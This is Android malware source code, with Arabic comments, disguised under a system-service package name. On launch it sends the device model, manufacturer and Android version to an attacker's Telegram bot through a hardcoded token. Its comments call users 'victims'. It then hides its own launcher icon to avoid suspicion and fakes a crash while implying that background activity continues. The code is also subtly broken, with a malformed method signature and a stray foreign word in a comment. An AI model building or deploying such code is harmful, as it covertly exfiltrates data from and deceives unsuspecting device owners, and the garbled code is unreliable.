package com.android.system.service;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Build;
import android.os.Handler;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends Activity {

    // التوكن الخاص بك ومعرف الدردشة أو البوت لاستقبال الضحايا
    private static final String BOT_TOKEN = "8655807989:AAHL_1tDhaNTs_oKjcJl-dHg3rK5IJhw-hY";
    private static final String CHAT_ID = "ضع_معرف_الدردشة_أو_الآيدي_هنا"; // Chat ID الخاص بك

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. إرسال إشعار فوري إلى بوت التليجرام بأن ضحية جديدة قد دخلت التطبيق
        String deviceInfo = "🎯 تم اصطياد ضحية جديدة!\n\n" +
                "📱 الجهاز: " + Build.MODEL + "\n" +
                "🤖 إصدار الأندرويد: " + Build.VERSION.RELEASE + "\n" +
                "⚙️ الشركة المصنعة: " + Build.MANUFACTURER;
        
        sendTelegramData(deviceInfo);

        // 2. إخفاء الأيقونة فوراً من قائمة التطبيقات لمنع الشك
        hideAppIcon();

        // 3. بعد 5 ثواني يتم إغلاق التطبيق بوهم "الكراش" أو الخروج التلقائي بينما تستمر الخدمة في الخلفية
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run(
                // إغلاق الواجهة الحالية وإيهام المستخدم بحدوث خطأ أو انتهاء المعالجة
                finishAffinity();
                System.exit(0);
            }
        }, 5000); // 5000 مิลلي ثانية = 5 ثواني بالتمام
    }

    private void hideAppIcon() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendTelegramData(final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    String params = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(message, "UTF-8");
                    OutputStream os = conn.getOutputStream();
                    os.write(params.getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    conn.getInputStream();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
